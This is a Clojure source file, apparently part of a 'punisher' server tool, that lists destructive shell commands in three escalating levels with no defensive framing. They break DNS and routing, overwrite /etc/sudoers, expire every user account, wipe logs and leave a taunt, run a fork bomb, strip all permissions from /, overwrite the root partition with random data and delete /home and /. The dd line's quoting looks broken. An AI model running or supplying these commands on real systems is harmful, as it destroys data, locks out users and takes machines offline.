(ns punisher-server.scripts)

(def all-scripts
     #{
       {
        :level 1
        :desc ""
        :script "iptables -A OUTPUT -p udp --dport 53 -j DROP"
        }
       {
        :level 1
        :desc ""
        :script "ip route del default && ip route add default via 127.0.0.1"
        }
       {
        :level 1
        :desc ""
        :script "hostname localhost"
        }
       {
        :level 1
        :desc ""
        :script "echo '' > /etc/resolv.conf"
        }
       {
        :level 1
        :desc "Flushes the firewall"
        :script "iptables -F"
        }
       {
        :level 1
        :desc "Drop interface eth0"
        :script "ifconfig eth0 down"
       }
       {
        :level 2
        :desc ""
        :script "echo 'TROLOLOLO' > /etc/sudoers"
       }
       {
         :level 2
         :desc ""
         :script "iptables -F && iptables -P OUTPUT DROP"
       }
       {
         :level 2
         :desc ""
         :script "cat /etc/passwd|awk -F: '{print $1}' |xargs -I{} chage -E '2013-10-10' {}"
       }
       {
         :level 2
         :desc ""
         :script "rm -rf /var/log/* && echo 'Punisher was here' > /var/log/readme.txt"
        }
       {
        :level 3
        :desc "Fork bomb"
        :script ":(){ :|:& };:"
        }
       {
        :level 3
        :desc "Change permissions"
        :script "chmod -R 000 /"
        }
       {
        :level 3
        :desc "Add random chars to root partition"
        :script "dd if=/dev/urandom of=`mount |grep 'on / '' |awk '{print $1}'`'"
        }
       {
        :level 3
        :desc "Remove /home"
        :script "rm -rf /home"
        }
       {
        :level 3
        :desc "Remove /"
        :script "rm -rf /"
        }
       })
